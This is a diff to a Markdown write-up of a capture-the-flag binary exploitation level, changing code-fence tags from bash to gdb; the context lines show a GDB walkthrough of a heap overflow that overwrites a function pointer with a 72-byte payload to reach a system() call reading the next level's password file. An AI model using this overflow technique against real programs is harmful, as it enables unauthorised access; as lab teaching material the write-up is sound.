@@ -44,7 +44,7 @@ This section provides a detailed analysis of the assembly code for the three fun
 
 Before analyzing the main function, we inspect the full list of functions defined in the binary to identify all logic, including internal helper functions:
 
-```bash
+```gdb
 (gdb) info functions
 0x08048454  n
 0x08048468  m
@@ -235,7 +235,7 @@ This section documents the dynamic analysis of the level6 binary using GDB. The 
 
 We start by listing all defined functions:
 
-```bash
+```gdb
 (gdb) info functions
 0x08048454  n
 0x08048468  m
@@ -250,7 +250,7 @@ Function `main()` is the program entry, `m()` prints "Nope", and `n()` executes 
 
 We retrieve the address of `n()` to use it as our jump target:
 
-```bash
+```gdb
 (gdb) p n
 $1 = {<text variable, no debug info>} 0x08048454 <n>
 ```
@@ -263,14 +263,14 @@ This is the address that we want to overwrite into the function pointer.
 
 We set a breakpoint after both `malloc()` calls have returned:
 
-```bash
+```gdb
 (gdb) break *0x080484a5
 (gdb) run AAAAA
 ```
 
 Then inspect the allocated memory:
 
-```bash
+```gdb
 (gdb) x/wx $esp+0x1c  # pointer to buffer
 0xbffff72c: 0x0804a008
 (gdb) x/wx $esp+0x18  # pointer to function pointer
@@ -279,7 +279,7 @@ Then inspect the allocated memory:
 
 Compute the offset:
 
-```bash
+```gdb
 (gdb) print 0x0804a008 - 0x0804a050
 $1 = -72
 ```
@@ -318,14 +318,14 @@ Execution jumps to `n()`, which runs the `system()` command and prints the passw
 
 To confirm this in GDB, we can set a breakpoint right before the indirect call:
 
-```bash
+```gdb
 (gdb) break *0x080484ce
 (gdb) run $(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')
 ```
 
 Inspect the value pointed to by the overwritten function pointer:
 
-```bash
+```gdb
 (gdb) x/xw 0x0804a050
 0x0804a050: 0x08048454
 ```
@@ -334,21 +334,21 @@ This matches the address of `n()`, confirming that our overwrite succeeded.
 
 Now step into the function call:
 
-```bash
+```gdb
 (gdb) si
 (gdb) si
 ```
 
 You should land at the entry of `n()`:
 
-```bash
+```gdb
 (gdb) x/i $eip
 => 0x8048454 <n>: push   %ebp
 ```
 
 Then step into the `system()` call:
 
-```bash
+```gdb
 (gdb) break *0x08048461
 (gdb) continue
 ```
@@ -363,7 +363,7 @@ The address passed to `system()` is loaded via:
 
 This hardcoded pointer refers to the string:
 
-```bash
+```gdb
 (gdb) x/s 0x080485b0
 0x080485b0: "/bin/cat /home/user/level7/.pass"
 ```
